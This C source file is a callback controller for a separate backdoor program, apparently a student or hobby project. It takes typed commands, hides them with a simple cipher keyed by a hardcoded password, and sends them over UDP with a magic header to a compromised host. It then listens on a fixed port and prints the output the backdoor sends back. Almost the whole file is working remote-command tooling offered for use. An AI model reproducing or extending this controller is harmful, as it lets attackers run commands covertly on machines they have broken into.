/*
	Author: Jordan Hamade
	Description: A call back client made for use with accompanying backdoor program
	
*/
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>
#include <stdlib.h>

#define SERVER_PORT 8505
#define BACKDOOR_HEADER "hello"
#define PASSWORD "P@$$w0rd"
#define PASSLEN 8
#define COMMAND_START "START["
#define COMMAND_END "]END"

int main(int argc, char *argv[]){

    int sock, rsd;
    struct sockaddr_in server, client, receiver;
    int client_len = 0;
    int opt = 1;
    char * host;
    int loop;

    unsigned short port;
    char unencrypted[1024], encrypted[1024];
    char command[1024], input[1024];
    struct hostent *hp;

    if(argc != 3){
        printf("Usage: %s <host address> <port>\n", argv[0]);
        exit(1);
    }

    host = argv[1];

    port = htons(atoi(argv[2]));

    bzero((char *)&server, sizeof(struct sockaddr_in));

    server.sin_family = AF_INET;

    server.sin_port = port;

    server.sin_addr.s_addr = inet_addr(host);

    //RSD setup
    bzero((char *)& receiver, sizeof(struct sockaddr_in));
    receiver.sin_family = AF_INET;
    receiver.sin_port = htons(SERVER_PORT);
    receiver.sin_addr.s_addr = htonl(INADDR_ANY);

    if((rsd = socket(AF_INET, SOCK_DGRAM, 0)) < 0){
        perror("Socket creation");
        exit(1);
    }

    if(setsockopt(rsd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0){
        fprintf(stderr, "setsockopt SO_REUSEADDR fail");
        exit(1);
    }

    if((bind(rsd, (struct sockaddr *)&receiver, sizeof(struct sockaddr_in))) < 0){
        perror("bind");
        exit(1);
    }
    //END OF RSD SETUP

    if((sock = socket(AF_INET, SOCK_DGRAM, 0))< 0){
        printf("could not create socket\n");
        exit(1);
    }

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0){
        fprintf(stderr, "setsockopt SO_REUSEADDR fail");
        exit(1);
    }


    //Read input
    while(1){
        strcpy(unencrypted, COMMAND_START);
        printf("Command:");
        fgets(input, 1024, stdin);
        strcat(unencrypted, input);
        strcat(unencrypted, COMMAND_END);
        strcpy(command, BACKDOOR_HEADER);
        //encrypt the data
        for(loop = 0; loop < strlen(unencrypted); loop++){
            encrypted[loop] = unencrypted[loop] + PASSWORD[(loop % PASSLEN)];
        }
        encrypted[loop] = '\0';
        strcat(command, encrypted);

        if(sendto(sock, command, (strlen(command)+1), 0, (struct sockaddr*)&server, sizeof(server)) < 0){
            perror("sendto()");
            exit(1);
        }

        //listen for response from backdoor
        while(1){
            char buf[1024];

            int len = recvfrom(rsd, buf, sizeof(buf), 0, (struct sockaddr*)&client, &client_len);
            buf[len] = '\0';

            if(strcmp(buf, COMMAND_END) == 0){
                break;
            }
            printf("%s", buf);
        }
    }
}
